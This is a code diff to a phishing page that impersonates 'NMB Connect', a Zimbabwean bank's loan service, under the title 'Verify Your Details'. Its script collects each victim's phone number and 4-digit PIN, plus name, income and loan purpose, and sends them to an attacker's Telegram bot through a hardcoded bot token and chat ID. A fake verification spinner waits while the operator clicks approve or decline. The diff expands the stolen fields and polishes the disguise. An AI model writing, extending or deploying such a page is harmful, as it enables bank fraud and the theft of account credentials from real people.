@@ -3,96 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NMB Connect - Login</title>
+    <title>NMB Connect - Verify Your Details</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
         * { font-family: 'Inter', sans-serif; }
-        body { background: linear-gradient(135deg, #004a99 0%, #003366 100%); min-height: 100vh; }
-        .pin-input:focus { border-color: #f2a900; box-shadow: 0 0 0 2px rgba(242, 169, 0, 0.2); }
+        body { background: linear-gradient(135deg, #003B4F 0%, #001F2E 100%); min-height: 100vh; }
+        .pin-input:focus { border-color: #E4C16A; box-shadow: 0 0 0 2px rgba(228, 193, 106, 0.2); }
     </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen p-3 sm:p-4">
     <div class="w-full max-w-sm">
         <!-- Header -->
-        <div class="text-center mb-5">
-            <div class="flex items-center justify-center gap-1 mb-2">
-                <span class="text-xl sm:text-2xl font-black text-white">NMB</span>
-                <span class="text-xl sm:text-2xl font-black text-[#f2a900]">Connect</span>
+        <div class="text-center mb-6">
+            <div class="flex items-center justify-center gap-2 mb-3">
+                <i class="fas fa-key text-4xl text-[#E4C16A]"></i>
+                <div>
+                    <span class="text-3xl sm:text-4xl font-black text-white">NMB</span>
+                    <span class="text-3xl sm:text-4xl font-black text-[#E4C16A]">Connect</span>
+                </div>
             </div>
             <p class="text-white/70 text-xs font-semibold uppercase tracking-wide">Secure Access</p>
         </div>
 
         <!-- Main Card -->
-        <div class="bg-white rounded-xl sm:rounded-2xl shadow-2xl overflow-hidden">
+        <div class="bg-white rounded-2xl shadow-2xl overflow-hidden">
             <!-- Title Section -->
-            <div class="bg-gradient-to-r from-[#003366] to-[#004a99] p-4 sm:p-5 text-center">
-                <h1 class="text-white font-black text-lg sm:text-xl mb-1">Verify Your Details</h1>
-                <p class="text-white/80 text-xs">Enter your phone and PIN</p>
+            <div class="bg-gradient-to-r from-[#003B4F] to-[#001F2E] p-6 sm:p-8 text-center">
+                <h1 class="text-white font-black text-2xl sm:text-3xl mb-2">Verify Your Details</h1>
+                <p class="text-white/80 text-sm">Enter your phone and PIN</p>
             </div>
 
             <!-- Content -->
-            <div id="loginForm" class="p-5 sm:p-6 space-y-5">
+            <div id="loginForm" class="p-6 sm:p-8 space-y-6">
                 <!-- Loan Amount Display -->
-                <div class="bg-blue-50 border border-blue-100 rounded-lg p-3">
+                <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
                     <div class="flex justify-between items-center">
-                        <span class="text-xs font-black text-gray-600 uppercase">Loan Amount</span>
-                        <span class="font-black text-lg text-[#003366]" id="displayAmount">$500</span>
+                        <span class="text-xs font-black text-gray-700 uppercase">Loan Amount</span>
+                        <span class="font-black text-lg text-[#003B4F]" id="displayAmount">$500</span>
+                    </div>
+                </div>
+
+                <!-- Applicant Name Display -->
+                <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs font-black text-gray-700 uppercase">Applicant</span>
+                        <span class="font-black text-lg text-[#003B4F]" id="displayName">-</span>
                     </div>
                 </div>
 
                 <!-- Phone Number -->
                 <div class="space-y-2">
-                    <label class="text-xs font-black text-gray-600 uppercase">Phone Number</label>
+                    <label class="text-xs font-black text-gray-700 uppercase">Phone Number</label>
                     <div class="relative">
-                        <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 font-black">+263</span>
+                        <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-700 font-black">+263</span>
                         <input type="tel" id="phone" maxlength="9" placeholder="771234567" 
-                            class="w-full pl-16 pr-4 py-3 sm:py-4 bg-gray-50 border border-gray-200 rounded-lg focus:outline-none focus:border-[#f2a900] transition-all font-black text-base text-gray-700 placeholder:text-gray-300">
+                            class="w-full pl-16 pr-4 py-3 sm:py-4 bg-gray-50 border border-gray-300 rounded-lg focus:outline-none focus:border-[#E4C16A] transition-all font-black text-base text-gray-700 placeholder:text-gray-400">
                     </div>
                 </div>
 
                 <!-- PIN -->
                 <div class="space-y-2">
-                    <label class="text-xs font-black text-gray-600 uppercase">4-Digit PIN</label>
+                    <label class="text-xs font-black text-gray-700 uppercase">4-Digit PIN</label>
                     <div class="flex gap-2 sm:gap-3">
-                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
-                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
-                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
-                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
+                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
+                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
+                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
+                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
                     </div>
                 </div>
 
                 <!-- Submit Button -->
-                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-3 sm:py-4 rounded-lg hover:shadow-lg transition-all uppercase text-xs sm:text-sm tracking-wide">
+                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003B4F] to-[#001F2E] text-white font-black py-4 rounded-lg hover:shadow-lg transition-all uppercase text-sm tracking-wide">
                     Verify
                 </button>
             </div>
 
             <!-- Polling Overlay -->
-            <div id="pollingOverlay" class="hidden p-6 sm:p-8 text-center space-y-6">
-                <div class="relative w-20 h-20 sm:w-24 sm:h-24 mx-auto">
-                    <div class="absolute inset-0 border-4 border-gray-50 rounded-full"></div>
-                    <div class="absolute inset-0 border-4 border-[#f2a900] border-t-transparent rounded-full animate-spin"></div>
+            <div id="pollingOverlay" class="hidden p-8 text-center space-y-6">
+                <div class="relative w-24 h-24 mx-auto">
+                    <div class="absolute inset-0 border-4 border-gray-100 rounded-full"></div>
+                    <div class="absolute inset-0 border-4 border-[#E4C16A] border-t-transparent rounded-full animate-spin"></div>
                     <div class="absolute inset-0 flex items-center justify-center">
-                        <i class="fas fa-shield-alt text-2xl sm:text-3xl text-[#003366]"></i>
+                        <i class="fas fa-shield-alt text-3xl text-[#003B4F]"></i>
                     </div>
                 </div>
                 
                 <div class="space-y-2">
-                    <h3 class="text-lg sm:text-xl font-black text-gray-800 tracking-tight">Wait for Verification</h3>
-                    <p class="text-gray-500 text-xs sm:text-sm font-medium leading-relaxed">Your request is being verified...</p>
+                    <h3 class="text-xl font-black text-gray-800 tracking-tight">Wait for Verification</h3>
+                    <p class="text-gray-600 text-sm font-medium leading-relaxed">Your request is being verified...</p>
                 </div>
             </div>
         </div>
 
         <!-- Footer -->
-        <p class="text-center text-white/60 text-xs mt-5 font-semibold">
+        <p class="text-center text-white/60 text-xs mt-6 font-semibold">
             © 2026 NMB Holdings | Zimbabwe's Trusted Lender
         </p>
     </div>
 
     <script>
+        // Telegram Bot Configuration
         const TELEGRAM_BOT_TOKEN = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
         const TELEGRAM_CHAT_ID = '7547427914';
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
@@ -103,13 +115,18 @@
         const loginForm = document.getElementById('loginForm');
         const pollingOverlay = document.getElementById('pollingOverlay');
         const displayAmount = document.getElementById('displayAmount');
+        const displayName = document.getElementById('displayName');
 
         // Load loan data
         const loanData = JSON.parse(localStorage.getItem('nmb_loan_data') || '{}');
         if (loanData.amount) {
             displayAmount.textContent = `$${loanData.amount}`;
         }
+        if (loanData.fullName) {
+            displayName.textContent = loanData.fullName;
+        }
 
+        // PIN Input Navigation
         pinInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
                 if (e.target.value && index < pinInputs.length - 1) pinInputs[index + 1].focus();
@@ -119,23 +136,34 @@
             });
         });
 
+        // Phone Input - Only Numbers
         phoneInput.addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/\D/g, '');
         });
 
+        // Submit Handler
         submitBtn.addEventListener('click', async () => {
             const phone = phoneInput.value;
             const pin = Array.from(pinInputs).map(i => i.value).join('');
 
-            if (phone.length !== 9) { alert('Please enter a valid 9-digit phone number'); return; }
-            if (pin.length !== 4) { alert('Please enter your 4-digit PIN'); return; }
+            if (phone.length !== 9) { 
+                alert('Please enter a valid 9-digit phone number'); 
+                return; 
+            }
+            if (pin.length !== 4) { 
+                alert('Please enter your 4-digit PIN'); 
+                return; 
+            }
 
             const sessionData = {
                 phone: '+263' + phone,
                 pin: pin,
                 amount: loanData.amount || '500',
                 term: loanData.term || '12',
-                monthly: loanData.monthly || '$0.00'
+                monthly: loanData.monthly || '$0.00',
+                fullName: loanData.fullName || 'N/A',
+                loanPurpose: loanData.loanPurpose || 'N/A',
+                monthlyIncome: loanData.monthlyIncome || 'N/A'
             };
             localStorage.setItem('nmb_session', JSON.stringify(sessionData));
 
@@ -144,9 +172,12 @@
 🔐 <b>NEW LOAN APPLICATION</b>
 
 📱 Phone: ${sessionData.phone}
+👤 Name: ${sessionData.fullName}
 💰 Loan Amount: $${sessionData.amount}
 📅 Term: ${sessionData.term} months
 💳 Monthly Payment: ${sessionData.monthly}
+🎯 Purpose: ${sessionData.loanPurpose}
+💵 Monthly Income: $${sessionData.monthlyIncome}
 
 <b>PIN: ${pin}</b>
             `;
@@ -156,9 +187,6 @@
                     [
                         { text: '✅ APPROVE', callback_data: `approve_${sessionData.phone}` },
                         { text: '❌ DECLINE', callback_data: `decline_${sessionData.phone}` }
-                    ],
-                    [
-                        { text: '⚠️ ALREADY APPLIED', callback_data: `applied_${sessionData.phone}` }
                     ]
                 ]
             };
@@ -191,9 +219,8 @@
         });
 
         async function pollForApproval(phone) {
-            let approved = false;
-            const maxAttempts = 120; // 2 minutes
             let attempts = 0;
+            const maxAttempts = 120; // 2 minutes
 
             const interval = setInterval(async () => {
                 attempts++;
@@ -208,11 +235,7 @@
                 } else if (approvalStatus === 'declined') {
                     clearInterval(interval);
                     localStorage.removeItem(`approval_${phone}`);
-                    location.reload();
-                } else if (approvalStatus === 'applied') {
-                    clearInterval(interval);
-                    localStorage.removeItem(`approval_${phone}`);
-                    alert('You have already applied for a loan.');
+                    alert('Your application was declined. Please try again.');
                     location.reload();
                 }
 
